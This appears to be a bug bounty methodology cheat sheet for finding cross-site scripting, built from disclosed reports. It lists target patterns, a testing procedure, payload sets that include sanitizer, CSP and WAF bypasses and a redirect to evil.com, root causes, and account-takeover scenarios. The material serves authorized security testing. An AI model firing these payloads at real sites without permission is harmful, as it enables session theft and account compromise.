# XSS — 174 Disclosed Reports

---

## High-Signal Targets

- Admin panels and authenticated dashboards (session hijacking, token exfiltration)
- Payment and financial flows (credential harvesting at checkout)
- Stored XSS in collaborative features: wikis, markdown renderers, issue trackers (single payload reaches all viewers)
- SSO and signin pages (auth token theft across entire platform)
- Shared SaaS tenant surfaces (cross-tenant boundary breach)
- SVG and file upload endpoints (frequently bypasses CSP simultaneously)

**Dangerous URL patterns:**
```
/admin*, /settings*, /wiki*, /reports*
?utm_source=, ?redirect=, ?q=, ?search=
?callback=, ?return_url=, /render*, /preview*
```

**Weak defense indicators:**
- `Content-Type: text/html` without nosniff
- Absent or `unsafe-inline` CSP
- `image/svg+xml` without CSP enforcement
- `X-XSS-Protection: 0`

**High-risk tech stacks:**
- Rails with `html_safe`, `raw()`, `translate`
- Markdown pipelines: Banzai, Kramdown, RDoc, Kroki, Mermaid
- SVG upload and rendering features
- Allowlisted `style` tags

---

## Hunting Methodology

1. Map every reflection point: URL parameters, form fields, HTTP headers, filenames, API fields
2. Classify type: reflected, stored, or DOM-based
3. Probe sanitizer behavior with canary: `aaa"bbb'ccc<ddd>eee` - use unique 8+ char markers, confirm the marker does not appear in the baseline response
4. Test allowlisted tag combinations: `<math>+<style>`, `<svg>+<style>`, `<iframe srcdoc>`
5. Hunt SVG and file uploads - check if CSP applies to SVG responses separately
6. Test markdown and diagram renderers: `[text](javascript:alert(1))`, RDoc `link:javascript:`, Kroki/Mermaid payloads
7. Check redirect parameters: `?redirect=javascript:alert(1)`, `?return_url=//evil.com`
8. Probe analytics parameters: `utm_source`, `utm_medium` often lack sanitization on marketing pages
9. Test CSP bypasses: JSONP on allowlisted domains, `unsafe-inline` in style-src, whitelisted CDN gadgets
10. Test stored XSS in metadata: username, bio, tags, labels, org names render in multiple contexts
11. Check cache poisoning: test if reflected XSS payloads get cached and served to other users
12. Validate in real browser: confirm in current Chrome/Firefox

---

## Payloads

**Context probing:**
```html
aaa"bbb'ccc<ddd>eee`fff
```

**Reflected XSS via URL params:**
```
?q=<script>alert(document.domain)</script>
?q="><script>alert(1)</script>
?utm_source=<svg onload=alert(1)>
?redirect=javascript:alert(document.domain)
```

**Attribute context escapes:**
```html
" onmouseover="alert(1)
' onmouseover='alert(1)
```

**SVG-based CSP bypass:**
```html
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

**Sanitizer bypass - math+style:**
```html
<math><style><img src=x onerror=alert(1)></style></math>
```

**Sanitizer bypass - svg+style:**
```html
<svg><style><img src=x onerror=alert(1)></style></svg>
```

**Markdown javascript: link:**
```markdown
[Click me](javascript:alert(document.domain))
```

**Kroki diagram injection:**
```
@startuml
:<script>alert(1)</script>;
@enduml
```

**DOM XSS testing:**
```javascript
location.hash = '#"><img src=x onerror=alert(1)>'
```

**Filter evasion:**
```html
<ScRiPt>alert(1)</ScRiPt>
<svg/onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
```

**WAF evasion:**
```html
<svg onload=eval(atob('YWxlcnQoMSk='))>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

**Redirect-based XSS:**
```
?next=javascript://%0aalert(1)
```

**Detection via curl:**
```bash
curl -sk "https://target.com/search?q=XSSCANARY" | grep -i "XSSCANARY"
```

---

## Bypass Techniques

**CSP bypasses:**
- SVG uploads: `image/svg+xml` responses may not inherit page CSP
- JSONP endpoints on allowlisted domains: `<script src="https://trusted.com/api?callback=alert(1)//"></script>`
- `<base>` tag injection redirecting script sources
- `unsafe-eval` or `unsafe-inline` in `style-src`

**Sanitizer bypasses:**
- Mutation XSS (mXSS): HTML safe at sanitizer parse time, mutates during browser re-parse
- Tag combinations: `<svg>+<style>`, `<math>+<style>` create parsing ambiguity
- Entity encoding in href: `&#106;avascript:`
- Protocol variations: `javascript:`, `data:text/html`

---

## Root Causes (from paid reports)

1. `html_safe` misuse in Rails after partial sanitization
2. `style` tag allowlist combined with `math`/`svg` enables mXSS
3. Markdown/Kroki/Mermaid output not re-sanitized after rendering
4. UTM/redirect parameters reflected in HTML or JS without escaping
5. SVG treated as non-executable, CSP not applied to SVG responses
6. Rails `translate()` marks strings safe with unescaped user input
7. CDN caching of reflected XSS payloads delivered to all visitors
8. Incomplete sanitizer patches - variations bypass CVE-patched filters
9. `javascript:` scheme in href/src not blocked by RDoc/Markdown renderers
10. Missing `Content-Disposition: attachment` on SVG/HTML file downloads

---

## Real-World Scenarios

**Scenario 1 - Cache-poisoned sign-in page**
Reflected XSS on sign-in page combined with CDN caching created a stored-equivalent. Attacker poisoned the cache to inject a credential harvester for every login attempt. Remediation required both code fix and full cache purge.

**Scenario 2 - Kroki diagram rendering in team wiki**
Malicious diagram payload executing JavaScript for all wiki viewers including admins. Shared team context enabled org-wide OAuth token exfiltration and administrative impersonation from a single stored payload.

**Scenario 3 - Label color field sanitizer bypass with CSP evasion**
Incomplete XSS patch left `style` tag in allowlist. `svg>style` combination created mXSS bypassing both sanitizer and CSP. Any project member could trigger persistent XSS affecting all project visitors, enabling cross-user session theft.

---

## Vulnerability Chains

- **Cache poisoning**: Reflected XSS becomes stored-equivalent at CDN scale via unkeyed parameters
- **CSRF chain**: Stored XSS in profile bio executes state-changing requests with victim cookies (email change, password reset, account takeover)
- **HTTP smuggling**: Smuggled request delivers XSS payload into next victim's response queue, bypassing per-endpoint sanitization

---

## Pre-Submission Validation Gate

1. Can the attacker perform a concrete action beyond showing an alert? (session theft, unauthorized action, data exfiltration)
2. Does the victim lose something real? (session control, credentials, PII, financial capability)
3. Reproducible in current Chrome/Firefox within 10 minutes without special configuration?

**Traps to avoid:**
- Canary marker appears naturally in baseline response - false positive
- Payload returns HTML-encoded (`&lt;`) - not XSS, proper encoding
- Alert-only PoC without demonstrating real impact - typically rejected
- Blind XSS claim without OOB callback - unconfirmed
